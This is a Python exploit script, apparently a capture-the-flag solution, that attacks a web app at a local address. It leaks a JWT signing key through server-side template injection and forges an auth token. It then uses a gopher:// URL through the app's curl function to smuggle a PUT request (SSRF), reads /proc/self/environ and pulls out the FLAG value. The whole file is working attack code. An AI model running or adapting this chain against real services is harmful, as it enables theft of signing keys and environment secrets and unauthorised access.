import requests
import re
import jwt
from urllib.parse import quote

global TARGET
TARGET = "http://172.18.0.2:8000"

def leak(input):
    r = requests.get(TARGET + "/eye?input=" + quote(input))
    bdata = r.content
    m = re.search(b'<span id="output">(.*)</span>\n        </div>\n    </div>\n</body>\n\n</html>$', bdata, re.DOTALL)
    if m:
        return m.group(1).decode()
    return None

def gen_http_raw(value, token):
    return f"""PUT /favorite HTTP/1.1
Host: localhost:8000
Content-Type: text/plain
Cookie: token={token}
Content-Length: {len(value)}

{value}""".replace("\n", "\r\n")

def wrap_gopher(payload):
    return  "gopher://localhost:8000/_" + quote(payload)

def read_file(fp, token):
    print("\033[96m[+] Generating payload\033[0m")
    payload = gen_http_raw(fp, token)
    payload = wrap_gopher(payload)
    print("\033[F\033[K\033[96;2m[+] Payload generated\033[0m")
    print("\033[96m[+] Sending payload\033[0m")
    status = leak(f"{{{{ .Curl \"{payload}\"}}}}")
    if status == "ok":
        print("\033[F\033[K\033[92;2m[+] Payload sent: \033[0;2m" + status + "\033[0m")
    else:
        print("\033[F\033[K\033[91m[-] Failed to send payload: \033[0m" + status)
        return None
    print("\033[96m[+] Reading file\033[0m")
    r = requests.get(TARGET + "/favorite")
    bdata = r.content
    m = re.search(b'<div class="text fixed" id="sign-text">(.*)</div>\n</body>\n\n</html>$', bdata, re.DOTALL)
    if m:
        print("\033[F\033[K\033[92m[+] File read: \033[0;4m" + fp + "\033[0m")
        fcontent = m.group(1).decode()
        print(fcontent)
        print("\033[0m", end="")
        return fcontent
    else:
        print("\033[F\033[K\033[91m[-] File read failed: \033[0m" + fp)
        return None

if __name__ == "__main__":
    import sys
    if len(sys.argv) >= 2:
        origin = sys.argv[1]
        TARGET = f"http://{origin}" if '://' not in origin else origin

    print(f"\033[96;2m[+] Target: \033[0;2m{TARGET}\033[0m")

    print("\033[96m[+] Leaking JWT Key\033[0m")
    jwtkey = leak("{{ .Config.JwtKey }}")
    print("\033[F\033[K\033[94m[+] JWT Key: \033[0m" + jwtkey)

    print("\033[96m[+] Generating JWT Token\033[0m")
    token = jwt.encode({"user": "Papa"}, jwtkey, algorithm="HS256")
    print("\033[F\033[K\033[94m[+] JWT Token: \033[0m" + token)

    environ = read_file("/proc/self/environ", token)
    if not environ:
        exit(1)

    m_flag = re.search(b'(^|\0|\n)FLAG=([^\0\r\n]+)', environ.encode())
    if m_flag:
        print("\033[92m[+] Found FLAG\033[0m")
        print("\033[94m[+] \033[1mFLAG: \033[0m" + m_flag.group(2).decode() + "\033[0m")
        exit(0)
    else:
        print("\033[93m[-] FLAG not found\033[0m")
        exit(1)